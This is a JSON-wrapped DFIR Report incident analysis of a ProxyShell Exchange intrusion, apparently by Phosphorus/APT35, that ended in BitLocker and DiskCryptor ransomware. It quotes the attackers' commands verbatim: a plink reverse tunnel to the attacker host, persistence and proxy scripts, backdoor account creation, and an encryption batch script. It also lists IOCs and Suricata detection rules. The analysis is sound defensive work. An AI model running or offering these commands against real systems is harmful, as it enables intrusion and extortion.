@@ -1,0 +1,349 @@
+{
+    "id": "2305aa56-831f-4e44-9a78-2227d0dcfa52",
+    "created_at": "2023-01-12T15:03:14.536935Z",
+    "updated_at": "2025-03-27T02:16:11.595824Z",
+    "deleted_at": null,
+    "sha1_hash": "36319a08ddffe3852cf999681836220d594fe97a",
+    "title": "2021-11-15 - Exchange Exploit Leads to Domain Wide Ransomware",
+    "authors": "",
+    "file_creation_date": "2022-05-25T14:20:01Z",
+    "file_modification_date": "2022-05-25T14:20:01Z",
+    "file_size": 1296162,
+    "plain_text": "# Exchange Exploit Leads to Domain Wide Ransomware\n\n**[thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware](https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/)**\n\nNovember 15, 2021\n\n## Intro\n\n#### In late September, we observed an intrusion in which initial access was gained by the threat actor exploiting multiple vulnerabilities in Microsoft Exchange. The threat actors in this case were attributed to a group Microsoft tracks as Phosphorus (aka APT35, Charming Kitten, Newscaster, TA453, Magic Hound, etc.) which is suspected to be an Iranian nation state operator.\n\n ProxyShell was used to deploy multiple web shells which lead to discovery actions, dumping of LSASS, use of Plink and Fast Reverse Proxy to proxy RDP connections into the environment. Furthermore, the actors encrypted systems domain wide, using BitLocker on servers and DiskCryptor on workstations, rather than affiliating with Ransomware as a Service (RaaS) programs or building an encryptor from scratch.\n\n ProxyShell is a name given to a combination of three vulnerabilities: CVE-2021-34473, CVE- 2021-34523, and CVE-2021-31207. An attacker chaining the exploitation of these vulnerabilities could execute arbitrary code with SYSTEM privileges on Exchange servers. Here’s some more information on ProxyShell : CISA Alert, NCSC Alert, Mandiant, Zero Day Initiative.\n\n The threat actors conducted this intrusion with almost no malware. It was a rare occurrence of a ransomware attack where Cobalt Strike was not used or any other C2 framework.\n\n## Case Summary\n\n#### We observed an intrusion where an adversary exploited multiple Exchange vulnerabilities (ProxyShell) to drop multiple web shells. Over the course of three days, three different web shells were dropped in publicly accessible directories. These web shells, exposed to the internet, were used to execute arbitrary code on the Microsoft Exchange Server utilizing PowerShell and cmd.\n\n After gaining an initial foothold on the Exchange system, the threat actors started discovery by executing commands like ipconfig, net, ping, systeminfo, and others, using the previously dropped web shells. This battery of initial discovery included a network call out to themoscowtimes[.]com. The threat actors repeated these tests twice over the first two days. On the third day, the next phase of the intrusion was underway.\n\n\n-----\n\n#### Since the commands executed via the web shell run with SYSTEM level privileges, threat actors took advantage of this and enabled a built-in account DefaultAccount, set the password and added it to Administrator and Remote Desktop Users groups. The threat actors then dropped Plink and established an SSH tunnel to expose RDP over the tunnel. They then connected to the Exchange server over RDP using the DefaultAccount account.\n\n They then copied their tools into the environment via RDP, which was observed when CacheTask.zip was copied to disk. This compressed file had a few files in it:\n\n CacheTask.bat CacheTask.xml dllhost.exe install-proxy.bat RuntimeBroker\n\n Right after the transfer, the adversaries executed install-proxy.bat to create two directories and move CacheTask.bat, dllhost.exe and RuntimeBroker into their respective folder. A scheduled task was created and executed, to execute install-proxy.bat, which established network persistence via Fast Reverse Proxy (FRP) which was used to proxy RDP traffic during the intrusion.\n\n Utilizing the Plink RDP connection, the threat actor dumped LSASS using Task Manager. Thirty minutes later, the threat actor started using a domain administrator account.\n\n Using the stolen Domain Admin account, adversaries performed port scanning with KPortScan 3.0 and then moved laterally using RDP. Targeted servers included backup systems and domain controllers. The threat actor also deployed the FRP package to these systems after gaining access.\n\n Finally, the threat actors deployed setup.bat across the servers in the environment using RDP and then used an open source disk encryption utility to encrypt the workstations. Setup.bat ran commands to enable BitLocker encryption, which resulted in the hosts being inoperable.\n\n To encrypt workstations, an open source utility called DiskCryptor was utilized. This was dropped on the workstations via RDP sessions and then executed to install the utility and setup the encryption. The utility required a reboot to install a kernel mode driver and then another reboot to lock out access to the workstations.\n\n The time to ransom (TTR) of this intrusion, from the first successful ProxyShell exploitation to ransom, was around 42 hours. If the blue team failed to detect the intrusion up until the DefaultAccount being enabled, they would have had 8 hours to respond and evict the threat actors before being ransomed.\n\n The threat actors left a ransom note requesting 8,000 USD to get the encryption keys for the systems.\n\n\n-----\n\n### Services\n\n#### We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, PoshC2, BazarLoader, etc. More information on this service and others can be found here.\n\n We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services. All artifacts including web shells, files, IPs, etc were added to this service in September.\n\n## Timeline\n\n\n-----\n\n#### Analysis and reporting completed by @0xtornado & @v3t0_\n\n\n-----\n\n#### Reviewed by @samaritan_o & @svch0st\n\n## MITRE ATT&CK\n\n### Initial Access\n\n#### This time we will talk about ProxyShell, which revealed itself around August 2021. Once again, the vulnerability affects Microsoft Exchange servers. Specifically, the on-prem versions identified as Exchange Server 2013, Exchange Server 2016 and Exchange Server 2019. It is interesting to note how the ProxyShell vulnerability, originally identified and exploited by Orange Tsai (@orange_8361), includes a chain of 3 different CVEs:\n\n CVE-2021-34473 CVE-2021-34523 CVE-2021-31207\n\n In this specific scenario, we observed the presence and exploitation of all the CVEs indicated above so; specifically, the attacker was able to exploit a Pre-auth Path Confusion Leads to ACL Bypass (CVE-2021-34473), an Elevation of Privilege on Exchange PowerShell Backend (CVE-2021-34523), and finally a Post-auth Arbitrary-File-Write Leads to RCE (CVE-2021- 31207). This last CVE allowed the creation of multiple web shells. The method used by the actor in this incident was to first use the elevated PowerShell privileges to run the following discovery cmdlets:\n```\nGet-MailboxRegionalConfiguration\nGet-Mailbox\nGet-ExchangeServer\nGet-InboxRule\n\n This was shortly followed by the cmdlet “New-ManagementRoleAssignment” responsible for granting mailbox import/export privileges before running “New-MailboxExportRequest”. The cmdlet would export a Mailbox to a provided location with the .aspx extention. While the file is a legitimate .pst file, in contains plaintext web shell code that is rendered by IIS when requested.\n\n Below is an example of one of the IPs who successfully exploited the vulnerabilities:\n\n```\n\n-----\n\n#### Three web shells were spotted during our investigation:\n\n The login.aspx web shell is a simple web shell which takes a command and runs it using cmd.exe. We believe the threat actor used aspx_qdajscizfzc.aspx to upload login.aspx and that’s why the parent process is w3wp. Here’s what the web shell looked like:\n\n This is the web shell code for login.aspx:\n\n\n-----\n\n#### The other two web shells were dropped upon the successful exploitation of ProxyShell. Running file command on these two web shells, show that they are actually PST files that contain web shell:\n```\n$ file *\naspx_gtonvbgidhh.aspx: Microsoft Outlook email folder (>=2003)\naspx_qdajscizfzx.aspx: Microsoft Outlook email folder (>=2003)\n\n The first web shell, aspx_qdajscizfzx.apsx, can upload files and runs cmd.exe:\n\n```\n\n-----\n\n#### The second web shell, aspx_gtonvbgidhh.apsx, can upload files and runs powershell.exe:\n\n\n-----\n\n### Execution\n\n#### The threat actors executed a script named install-proxy.bat, containing the following lines of code:\n```\n@echo off\ncd /D \"%~dp0\"\nmkdir C:\\ProgramData\\Microsoft\\Windows\\Runtime\\\nmkdir C:\\ProgramData\\Microsoft\\Windows\\DllHost\\\nmove /Y dllhost.exe C:\\ProgramData\\Microsoft\\Windows\\DllHost\\dllhost.exe\nmove /Y RuntimeBroker C:\\ProgramData\\Microsoft\\Windows\\Runtime\\RuntimeBroker\nmove /Y CacheTask.bat C:\\ProgramData\\Microsoft\\CacheTask.bat\nschtasks.exe /End /tn \"\\Microsoft\\Windows\\Maintenance\\CacheTask\"\nschtasks.exe /Delete /tn \"\\Microsoft\\Windows\\Maintenance\\CacheTask\"\nschtasks.exe /Create /F /XML CacheTask.xml /tn\n\"\\Microsoft\\Windows\\Maintenance\\CacheTask\"\nschtasks.exe /Run /tn \"\\Microsoft\\Windows\\Maintenance\\CacheTask\"\ndel /F CacheTask.xml\nstart /b \"\" cmd /c del \"%~f0\"&exit /b\n\n The script creates two directories, then moves files into their respective directories. It first stops and then deletes a task named CacheTask if it exists. It then Creates a schedule task which will call an XML file which then executes CacheTask.bat\n\n```\n\n-----\n\n#### CacheTask.bat is a script that loops the execution of the Fast Reverse Proxy (FRP) binary:\n```\n:loop\nC:\\ProgramData\\Microsoft\\Windows\\DllHost\\dllhost.exe\ngoto loop\n\n Below is a screenshot of dllhost.exe hash lookup in VirusTotal, matching Florian Roth’s Yara rule HKTL_PUA_FRP_FastReverseProxy_Oct21_1:\n\n```\n\n-----\n\n#### The C:\\ProgramData\\Microsoft\\Windows\\Runtime\\RuntimeBroker file is linked to the execution above, and contained the following lines of code which are a configuration file for FRP:\n```\n[common]\nlog_level = trace\nlogin_fail_exit = true\n[RedactedHOSTNAME.RedactedDOMAIN_RedactedIP]\ntype = tcp\nremote_port = 10151\nplugin = http_proxy\nuse_encryption = true\nuse_compression = true\n\n The above configuration creates a http proxy bound to port 10151/tcp using encryption and compression.\n\n The threat actors also dropped and executed plink.exe, creating a remote SSH tunnel to 148.251.71[.]182 (tcp[.]symantecserver[.]co) in order to reach the RDP port on the Exchange system over the internet:\n\"powershell.exe\" /c echo y | plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389\n148.251.71.182 -P 22 -l forward -pw Socks@123 -no-antispoof\n\n```\n\n-----\n\n#### In the command line above you can see several options being used:\n```\n-N : To avoid starting the shell\n-T : To avoid the allocation of a pseudo-terminal\n-R : Forward remote port to local address\n-P 22 : Port number\n-l forward : Login name\n-pw Socks@123 : Login password\n-no-antispoof : To omit anti-spoofing prompt after authentication\n\n After running the above Plink command, the threat actors had RDP access into the environment over the SSH tunnel.\n\n### Persistence\n\n#### Valid Accounts\n To maintain persistence on patient 0, the threat actors leveraged the built-in DefaultAccount. It is a user-neutral account that can be used to run processes that are either multi-user aware or user-agnostic. The DSMA is disabled by default on the desktop SKUs (full windows SKUs) and WS 2016 with the Desktop (Reference).\n\n To achieve persistence, the threat actors enabled the DefaultAccount by running the following command, using a web shell:\n\"powershell.exe\" /c net user DefaultAccount /active:yes\n\n After activating the account, the threat actors set the password of this account to P@ssw0rd and added it to Administrators and Remote Desktop Users groups.\n\"powershell.exe\" /c net user DefaultAccount P@ssw0rd\n\"powershell.exe\" /c net localgroup \"Remote Desktop Users\" /Add DefaultAccount\n\"powershell.exe\" /c net localgroup Administrators /Add DefaultAccount\n\n### Privilege Escalation\n\n#### ProxyShell exploitation provided the threat actors with NT AUTHORITY\\SYSTEM privileges. Those privileges allowed them to enable the DefaultAdmin account to get access to the Mail Server using valid credentials. Moreover, the threat actors managed to dump LSASS and steal a domain administrator account, which was used to perform lateral movement.\n\n### Defense Evasion\n\n#### Advanced defense evasion techniques, such as impairing defenses or process injections, were not used during this intrusion. However, the threat actors performed masquerading with many of their tools:\n\n They created login.aspx web shell in the same folder as the legitimate OWA login page. They renamed Fast Reverse Proxy to dllhost.exe to remain stealthy\n\n```\n\n-----\n\n#### They created the Scheduled Task with \\Microsoft\\Windows\\Maintenance\\CacheTask name to stay un-noticed\n\n### Credential Access\n\n#### LSASS Dump\n The threat actors dumped LSASS process manually using the Task Manager CAR-2019-08- 001:\n```\nFile created:\nRuleName: UtcTime: REDACTED 10:40:24.958\nProcessGuid: {BF388D9C-AB02-614D-B552-000000000700}\nProcessId: 17480\nImage: C:\\Windows\\system32\\taskmgr.exe\nTargetFilename: C:\\Users\\DefaultAccount\\AppData\\Local\\Temp\\2\\lsass.DMP\n\n To facilitate the LSASS dump exfiltration, the threat actors created a zip archive named lsass.zip:\nFile created:\nRuleName: UtcTime: REDACTED 10:40:48.698\nProcessGuid: {BF388D9C-AADF-614D-A052-000000000700}\nProcessId: 17412\nImage: C:\\Windows\\Explorer.EXE\nTargetFilename: C:\\Users\\DefaultAccount\\AppData\\Local\\Temp\\2\\lsass.zip\n\n### Discovery\n\n#### Environment Discovery\n\n As previously mentioned, we saw multiple cmdlets related to exchange:\nGet-MailboxRegionalConfiguration\nGet-Mailbox\nGet-ExchangeServer\nGet-InboxRule\n\n Using the dropped web shells, the threat actors performed the following commands:\n\n```\n\n-----\n\n#### Port Scanning\n\n The threat actors used KPortScan 3.0, a widely used port scanning tool on Hacking Forums, to perform network scanning on the internal network:\n\n\n-----\n\n### Lateral Movement\n\n#### The threat actors mainly used Remote Desktop Services (RDP) to move laterally to other servers using the stolen domain admin account. Below is an extract focusing on RDP activity from patient 0:\n\n\n-----\n\n#### The threat actors also appeared to use Impacket’s wmiexec to perform lateral movement on one of the domain controllers.\n\n We do not have a clear explanation for that behavior. However, we strongly believe that this was related to the deployment of the encryption script, as it happened just a few minutes before its manual execution on servers.\n\n### Collection\n\n#### No data collection was observed in this intrusion. The threat actors only collected the dumped LSASS using a zip archive:\n```\nFile created:\nRuleName: UtcTime: REDACTED 10:40:48.698\nProcessGuid: {BF388D9C-AADF-614D-A052-000000000700}\nProcessId: 17412\nImage: C:\\Windows\\Explorer.EXE\nTargetFilename: C:\\Users\\DefaultAccount\\AppData\\Local\\Temp\\2\\lsass.zip\nCreationUtcTime: REDACTED 10:40:48.697\n\n### Command and Control\n\n#### No Command and Control frameworks were used during this intrusion. Initial access to the environment was performed using the web shell upon the exploitation of ProxyShell, then using valid accounts and Remote Desktop Services.\n\n Threat actors created a SSH tunnel to 148.251.71[.]182 using plink in order to forward RDP access:\n\n```\n\n-----\n\n#### Looking at this IP address on VirusTotal, we can observe that all “Communicating Files” related to it trigger FRP AV Signatures or Yara rules:\n\n We can conclude that those threat actors are used to this protocol tunneling technique.\n\n### Exfiltration\n\n#### Except lsass.zip, no data exfiltration or staging have been observed during this intrusion.\n\n### Impact\n\n#### In this intrusion the threat actors used BitLocker and an open source encrypter, DiskCryptor, in order to encrypt systems domain wide. On servers a batch script named setup.bat was used and on workstations the GUI application named dcrypt.exe(DiskCryptor) was executed instead. Both were executed via the threat actors after RDP login to each host.\n\n On servers they copied over a file named setup.bat.\n\n\n-----\n\n#### They then manually executed the script which disables the event log service, enables BitLocker (and RDP), prepares system drive using BdeHdCfg (a BitLocker drive encryption preparation tool), restarts the system, and deletes itself.\n\n Below are the commands executed by the script:\n\n\n-----\n\n```\nnet stop eventlog /y\nsc config TermService start= auto\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v TSEnabled /t\nREG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v\nfDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\"\n/v UserAuthentication /t REG_DWORD /d 0 /f\nnetsh advfirewall firewall add rule name=\"Terminal Server\" dir=in action=allow\nprotocol=TCP localport=3389\nnet start TermService\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v EnableBDEWithNoTPM /t REG_DWORD /d 1\n/f\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseAdvancedStartup /t REG_DWORD /d 1\n/f\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseTPM /t REG_DWORD /d 2 /f\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseTPMKey /t REG_DWORD /d 2 /f\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseTPMKeyPIN /t REG_DWORD /d 2 /f\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /V RecoveryKeyMessageSource /t\nREG_DWORD /d 2 /f\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v UseTPMPIN /t REG_DWORD /d 2 /f\nREG ADD HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE /v RecoveryKeyMessage /t REG_SZ /d \" ++-+- Your drives are Encrypted! Contact us immediately: REDACTED@onionmail.org -+-++\" /f\npowershell -c \"Import-Module ServerManager; ADD-WindowsFeature BitLocker -Restart\"\npowershell -c \"Install-WindowsFeature BitLocker ΓÇôIncludeAllSubFeature IncludeManagementTools -Restart\"\npowershell -c \"Initialize-Tpm -AllowClear -AllowPhysicalPresence -ErrorAction\nSilentlyContinue\"\npowershell -c \"Get-Service -Name defragsvc -ErrorAction SilentlyContinue | SetService -Status Running -ErrorAction SilentlyContinue\"\npowershell -c \"BdeHdCfg -target $env:SystemDrive shrink -quiet -restart\"\nsc config eventlog start= auto\ncmd /c del \"C:\\Windows\\setup.bat\"\ncmd /c del \"C:\\Users\\REDACTED\\Desktop\\setup.bat\"\n\n#### Running this script on servers made them inaccessible, and the following BitLocker encryption message was shown when restarted:\n\n```\n\n-----\n\n#### A binary called dcrypt.exe, was dropped on a backup server and immediately deleted. While this utility was not executed on any servers in the environment it was deployed to all the workstations.\n\n\n-----\n\n#### The executable used is the current release of the installer for the utility DiskCryptor.\n\n We are unsure why DiskCrypter was used on workstations but we believe it may have something to do with not all workstation versions supporting BitLocker.\n\n https://en.wikipedia.org/wiki/BitLocker\n\n Use of this utility on workstations ensures a reliable encryption without the need to develop their own ransomware or get into a ransomware as a service affiliate program.\n\n This executable, however, reminds you on install that it is “beta” software.\n\n The setup process then works as most windows installers and requires a reboot of the system. During installation a kernel mode driver is added to support the encryption process.\n\n After reboot, the program GUI allows you to configure the encryption options.\n\n\n-----\n\n#### After encryption completed, the systems were rebooted and left with the following screen:\n\n\n-----\n\n#### The threat actors left their note requesting 8,000 USD on a domain controller which was not rebooted or locked out. The note pointed to Telegram and ProtonMail contacts\n\n## IOCs\n\n\n-----\n\n#### All artifacts including web shells, files, IPs, etc were added to our servers in September.\n\n### Network\n```\nPlink\n148.251.71.182 \ntcp.symantecserver.co\ndllhost.exe connected to the following IPs over 443\n18.221.115.241\n217.23.5.42\n37.139.3.208\n148.251.71.182\nConnected to aspx_gtonvbgidhh.aspx\n198.144.189.74\n86.57.38.156\n\n File\n- dcrypt.exe\n  - md5: 3375fe67827671e121d049f9aabefc3e\n  - SHA1: e5286dbd0a54a110b39eb1e3e7015d82f316132e\n  - SHA256: 02ac3a4f1cfb2723c20f3c7678b62c340c7974b95f8d9320941641d5c6fd2fee\n- dllhost.exe\n  - md5: d4a55e486f5e28168bc4554cffa64ea0\n  - SHA1: 49c222afbe9c610fa75ffbbfb454728e608c8b57\n  - SHA256: e3eac25c3beb77ffed609c53b447a81ec8a0e20fb94a6442a51d72ca9e6f7cd2\n- login.aspx\n  - md5: 7c2b567b659246d2b278da500daa9abe\n  - SHA1: 83d21bb502b73016ec0ad7d6c725d71aaffa0f6d\n  - SHA256: 98ccde0e1a5e6c7071623b8b294df53d8e750ff2fa22070b19a88faeaa3d32b0\n- aspx_gtonvbgidhh.aspx\n  - md5: 34623dc70d274157dbc6e08b21154a3f\n  - SHA1: 3664e6e27fb2784f44f6dba6105ac8b90793032a\n  - SHA256: dc4186dd9b3a4af8565f87a9a799644fce8af25e3ee8777d90ae660d48497a04\n- aspx_qdajscizfzx.aspx\n  - md5: 31f05b4ee52f0512c96d0cc6f158e083\n  - SHA1: ef949770ae46bb58918b0fe127bec0ec300b18a9\n  - SHA256: 60d22223625c86d7f3deb20f41aec40bc8e1df3ab02cf379d95554df05edf55c\n\n## Detections\n\n### Network\nET INFO User-Agent (python-requests) Inbound to Webserver\n\n```\n\n-----\n\n```\nalert tcp any any > [$HOME_NET,$HTTP_SERVERS] [443,444] (msg: ET EXPLOIT Possible\nMicrosoft Exchange RCE Inbound M2 (CVE-2021-34473)\"; flow:established,to_server;\ncontent:\"POST\"; http_method; content:\"/autodiscover.json?\"; http_uri;\ncontent:\"/PowerShell/\"; distance:0; http_uri; content:\"&X-Rps-CAT=\"; distance:0;\nfast_pattern; http_uri; content:\"&Email=\"; distance:0; http_uri;\ncontent:\"autodiscover/\"; distance:0; within:20; http_uri; reference:cve,2021-34473;\nclasstype:attempted-admin; sid:2033711; rev:1; metadata:affected_product MS_Exchange,\nattack_target Server, created_at 2021_08_12, cve CVE_2021_34473, deployment\nPerimeter, deployment Internal, former_category EXPLOIT, signature_severity Major,\ntag Exploit, updated_at 2021_08_12;)\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:\"ET EXPLOIT Possible\nMicrosoft Exchange RCE with Python PSRP Client UA Inbound (CVE-2021-34473)\";\nflow:established,to_server; content:\"POST\"; http_method;\ncontent:\"/autodiscover/autodiscover.json?\"; http_uri;\ncontent:\"Python|20|PSRP|20|Client\"; fast_pattern; http_header; pcre:\"/^UserAgent\\x3a\\x20[^\\r\\n]+Python\\x20PSRP\\x20Client/Hmi\"; reference:cve,2021-34473;\nclasstype:attempted-admin; sid:2033712; rev:1; metadata:affected_product MS_Exchange,\nattack_target Server, created_at 2021_08_12, cve CVE_2021_34473, deployment\nPerimeter, deployment Internal, former_category EXPLOIT, signature_severity Major,\ntag Exploit, updated_at 2021_08_12;)\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:\"ET EXPLOIT Possible\nMicrosoft Exchange RCE Inbound M1 (CVE-2021-34473)\"; flow:established,to_server;\ncontent:\"POST\"; http_method; content:\"/ews/exchange.asmx\"; fast_pattern; http_uri;\ncontent:\"<s\"; http_client_body; content:\"SerializedSecurityContext>\"; distance:0;\nhttp_client_body; content:\"Message>\"; distance:0; http_client_body;\ncontent:\"Attachments>\"; distance:0; http_client_body; content:\"Content>\"; distance:0;\nhttp_client_body; content:\"|60 c2 ac c2 aa|\"; distance:0; within:200;\nhttp_client_body; reference:cve,2021-34473; classtype:attempted-admin; sid:2033684;\nrev:3; metadata:affected_product MS_Exchange, attack_target Server, created_at\n2021_08_09, cve CVE_2021_34473, deployment Perimeter, deployment Internal, deployment\nSSLDecrypt, former_category EXPLOIT, signature_severity Major, tag Exploit,\nupdated_at 2021_08_12;)\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] any (msg:\"ET EXPLOIT Microsoft\nExchange Pre-Auth Path Confusion M2 (CVE-2021-31207)\"; flow:established,to_server;\ncontent:\"/autodiscover?\"; nocase; http_uri; content:\"/mapi/nspi\"; nocase; distance:0;\nfast_pattern; http_uri; content:\"Email=autodiscover/\"; nocase; http_cookie;\nflowbits:set,ET.cve.2021.34473; reference:cve,2021-31207; classtype:attempted-admin;\nsid:2033682; rev:2; metadata:affected_product MS_Exchange, attack_target Server,\ncreated_at 2021_08_09, cve CVE_2021_31207, deployment Perimeter, deployment Internal,\ndeployment SSLDecrypt, former_category EXPLOIT, signature_severity Major, tag\nExploit, updated_at 2021_08_09;)\nalert tcp [$HOME_NET,$HTTP_SERVERS] any -> any any (msg:\"ET EXPLOIT Vulnerable\nMicrosoft Exchange Server Response (CVE-2021-31207)\"; flow:established,from_server;\nflowbits:isset,ET.cve.2021.34473; content:\"302\"; http_stat_code; reference:cve,202131207; classtype:attempted-admin; sid:2033683; rev:1; metadata:affected_product\nMS_Exchange, attack_target Server, created_at 2021_08_09, cve CVE_2021_31207,\ndeployment Perimeter, deployment Internal, former_category EXPLOIT,\nsignature_severity Major, tag Exploit, updated_at 2021_08_09;)\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:\"ET EXPLOIT Microsoft\nExchange SUID Disclosure via SSRF Inbound (CVE-2021-31207)\";\nflow:established,to_server; content:\"/autodiscover?\"; nocase; http_uri;\ncontent:\"Email=autodiscover/\"; nocase; http_uri; content:\"/mapi/emsmdb\"; nocase;\ndistance:0; fast_pattern; http_uri; reference:cve,2021-31207; classtype:attemptedadmin; sid:2033701; rev:2; metadata:affected_product MS_Exchange, attack_target\nServer, created_at 2021_08_10, cve CVE_2021_31207, deployment Perimeter, deployment\n\n```\n\n-----\n\n```\nInternal, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at\n2021_08_10;)\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] any (msg:\"ET EXPLOIT Microsoft\nExchange Pre-Auth Path Confusion M1 (CVE-2021-31207)\"; flow:established,to_server;\ncontent:\"/autodiscover?\"; nocase; http_uri; fast_pattern;\ncontent:\"Email=autodiscover/\"; nocase; http_uri; flowbits:set,ET.cve.2021.34473;\nreference:cve,2021-31207; classtype:attempted-admin; sid:2033681; rev:3;\nmetadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_09,\ncve CVE_2021_31207, deployment Perimeter, deployment Internal, deployment SSLDecrypt,\nformer_category EXPLOIT, signature_severity Major, tag Exploit, updated_at\n2021_08_12;)\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:\"ET EXPLOIT Possible\nMicrosoft Exchange RCE Inbound M2 (CVE-2021-34473)\"; flow:established,to_server;\ncontent:\"POST\"; http_method; content:\"/autodiscover.json?\"; http_uri;\ncontent:\"/PowerShell/\"; distance:0; http_uri; content:\"&X-Rps-CAT=\"; distance:0;\nfast_pattern; http_uri; content:\"&Email=\"; distance:0; http_uri;\ncontent:\"autodiscover/\"; distance:0; within:20; http_uri; reference:cve,2021-34473;\nclasstype:attempted-admin; sid:2033711; rev:1; metadata:affected_product MS_Exchange,\nattack_target Server, created_at 2021_08_12, cve CVE_2021_34473, deployment\nPerimeter, deployment Internal, former_category EXPLOIT, signature_severity Major,\ntag Exploit, updated_at 2021_08_12;)\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:\"ET EXPLOIT Possible\nMicrosoft Exchange RCE with Python PSRP Client UA Inbound (CVE-2021-34473)\";\nflow:established,to_server; content:\"POST\"; http_method;\ncontent:\"/autodiscover/autodiscover.json?\"; http_uri;\ncontent:\"Python|20|PSRP|20|Client\"; fast_pattern; http_header; pcre:\"/^UserAgent\\x3a\\x20[^\\r\\n]+Python\\x20PSRP\\x20Client/Hmi\"; reference:cve,2021-34473;\nclasstype:attempted-admin; sid:2033712; rev:1; metadata:affected_product MS_Exchange,\nattack_target Server, created_at 2021_08_12, cve CVE_2021_34473, deployment\nPerimeter, deployment Internal, former_category EXPLOIT, signature_severity Major,\ntag Exploit, updated_at 2021_08_12;)\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:\"ET EXPLOIT Possible\nMicrosoft Exchange RCE Inbound M1 (CVE-2021-34473)\"; flow:established,to_server;\ncontent:\"POST\"; http_method; content:\"/ews/exchange.asmx\"; fast_pattern; http_uri;\ncontent:\"<s\"; http_client_body; content:\"SerializedSecurityContext>\"; distance:0;\nhttp_client_body; content:\"Message>\"; distance:0; http_client_body;\ncontent:\"Attachments>\"; distance:0; http_client_body; content:\"Content>\"; distance:0;\nhttp_client_body; content:\"|60 c2 ac c2 aa|\"; distance:0; within:200;\nhttp_client_body; reference:cve,2021-34473; classtype:attempted-admin; sid:2033684;\nrev:3; metadata:affected_product MS_Exchange, attack_target Server, created_at\n2021_08_09, cve CVE_2021_34473, deployment Perimeter, deployment Internal, deployment\nSSLDecrypt, former_category EXPLOIT, signature_severity Major, tag Exploit,\nupdated_at 2021_08_12;)\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] any (msg:\"ET EXPLOIT Microsoft\nExchange Pre-Auth Path Confusion M2 (CVE-2021-31207)\"; flow:established,to_server;\ncontent:\"/autodiscover?\"; nocase; http_uri; content:\"/mapi/nspi\"; nocase; distance:0;\nfast_pattern; http_uri; content:\"Email=autodiscover/\"; nocase; http_cookie;\nflowbits:set,ET.cve.2021.34473; reference:cve,2021-31207; classtype:attempted-admin;\nsid:2033682; rev:2; metadata:affected_product MS_Exchange, attack_target Server,\ncreated_at 2021_08_09, cve CVE_2021_31207, deployment Perimeter, deployment Internal,\ndeployment SSLDecrypt, former_category EXPLOIT, signature_severity Major, tag\nExploit, updated_at 2021_08_09;)\nalert tcp [$HOME_NET,$HTTP_SERVERS] any -> any any (msg:\"ET EXPLOIT Vulnerable\nMicrosoft Exchange Server Response (CVE-2021-31207)\"; flow:established,from_server;\nflowbits:isset,ET.cve.2021.34473; content:\"302\"; http_stat_code; reference:cve,2021\n```\n\n-----\n\n```\n31207; classtype:attempted admin; sid:2033683; rev:1; metadata:affected_product\nMS_Exchange, attack_target Server, created_at 2021_08_09, cve CVE_2021_31207,\ndeployment Perimeter, deployment Internal, former_category EXPLOIT,\nsignature_severity Major, tag Exploit, updated_at 2021_08_09;)\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] [443,444] (msg:\"ET EXPLOIT Microsoft\nExchange SUID Disclosure via SSRF Inbound (CVE-2021-31207)\";\nflow:established,to_server; content:\"/autodiscover?\"; nocase; http_uri;\ncontent:\"Email=autodiscover/\"; nocase; http_uri; content:\"/mapi/emsmdb\"; nocase;\ndistance:0; fast_pattern; http_uri; reference:cve,2021-31207; classtype:attemptedadmin; sid:2033701; rev:2; metadata:affected_product MS_Exchange, attack_target\nServer, created_at 2021_08_10, cve CVE_2021_31207, deployment Perimeter, deployment\nInternal, former_category EXPLOIT, signature_severity Major, tag Exploit, updated_at\n2021_08_10;)\nalert tcp any any -> [$HOME_NET,$HTTP_SERVERS] any (msg:\"ET EXPLOIT Microsoft\nExchange Pre-Auth Path Confusion M1 (CVE-2021-31207)\"; flow:established,to_server;\ncontent:\"/autodiscover?\"; nocase; http_uri; fast_pattern;\ncontent:\"Email=autodiscover/\"; nocase; http_uri; flowbits:set,ET.cve.2021.34473;\nreference:cve,2021-31207; classtype:attempted-admin; sid:2033681; rev:3;\nmetadata:affected_product MS_Exchange, attack_target Server, created_at 2021_08_09,\ncve CVE_2021_31207, deployment Perimeter, deployment Internal, deployment SSLDecrypt,\nformer_category EXPLOIT, signature_severity Major, tag Exploit, updated_at\n2021_08_12;)\n\n### Sigma\n\n Yara\nValhalla/Loki Yara Sigs\nWEBSHELL_ASPX_ProxyShell_Aug21_2\nWEBSHELL_ASPX_ProxyShell_Aug21_2\nSUSP_ASPX_PossibleDropperArtifact_Aug21\nSUSP_ASPX_PossibleDropperArtifact_Aug21\n\n```\n\n-----\n\n```\n/\n  YARA Rule Set\n  Author: The DFIR Report\n  